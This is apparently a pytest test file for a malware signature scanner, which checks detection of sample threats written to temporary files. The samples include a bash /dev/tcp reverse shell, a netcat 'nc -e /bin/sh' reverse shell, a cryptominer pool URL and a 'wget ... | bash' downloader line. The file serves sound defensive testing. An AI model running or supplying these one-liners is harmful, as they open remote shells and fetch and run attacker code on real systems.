"""
Unit tests for Antivirus Signature & Heuristic Scanner (Module 10).
"""
import os
import shutil
import tempfile
import pytest

from chronos.intelligence.scanner import SignatureEngine


@pytest.fixture
def scanner():
    return SignatureEngine()


def test_scanner_detects_bash_reverse_shell(scanner):
    with tempfile.NamedTemporaryFile("wb", delete=False) as f:
        f.write(b"#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
        temp_path = f.name

    try:
        res = scanner.scan_file(temp_path)
        assert res.is_threat is True
        assert res.threat_name == "ReverseShell.Bash.Generic"
        assert res.severity == "CRITICAL"
        assert res.confidence >= 0.9
    finally:
        os.remove(temp_path)


def test_scanner_detects_netcat_reverse_shell(scanner):
    with tempfile.NamedTemporaryFile("wb", delete=False) as f:
        f.write(b"nc -e /bin/sh 192.168.1.50 8080\n")
        temp_path = f.name

    try:
        res = scanner.scan_file(temp_path)
        assert res.is_threat is True
        assert res.threat_name == "ReverseShell.Netcat.Exec"
        assert res.severity == "CRITICAL"
    finally:
        os.remove(temp_path)


def test_scanner_detects_cryptominer_config(scanner):
    with tempfile.NamedTemporaryFile("wb", delete=False) as f:
        f.write(b"stratum+tcp://xmr.pool.minergate.com:45700 --user test\n")
        temp_path = f.name

    try:
        res = scanner.scan_file(temp_path)
        assert res.is_threat is True
        assert "CryptoMiner" in res.threat_name
        assert res.severity == "HIGH"
    finally:
        os.remove(temp_path)


def test_scanner_reports_clean_for_benign_code(scanner):
    with tempfile.NamedTemporaryFile("wb", delete=False) as f:
        f.write(b"#!/usr/bin/env python3\nprint('Hello Security!')\n")
        temp_path = f.name

    try:
        res = scanner.scan_file(temp_path)
        assert res.is_threat is False
        assert res.severity == "CLEAN"
    finally:
        os.remove(temp_path)


def test_scanner_directory_scan(scanner):
    temp_dir = tempfile.mkdtemp()
    try:
        clean_file = os.path.join(temp_dir, "clean.sh")
        with open(clean_file, "w") as f:
            f.write("#!/bin/bash\necho 'clean'\n")

        mal_file = os.path.join(temp_dir, "malicious.sh")
        with open(mal_file, "w") as f:
            f.write("wget http://malware.site/payload | bash\n")

        threats = scanner.scan_directory(temp_dir)
        assert len(threats) == 1
        assert threats[0].threat_name == "Linux.Downloader.WgetPipeBash"
    finally:
        shutil.rmtree(temp_dir)
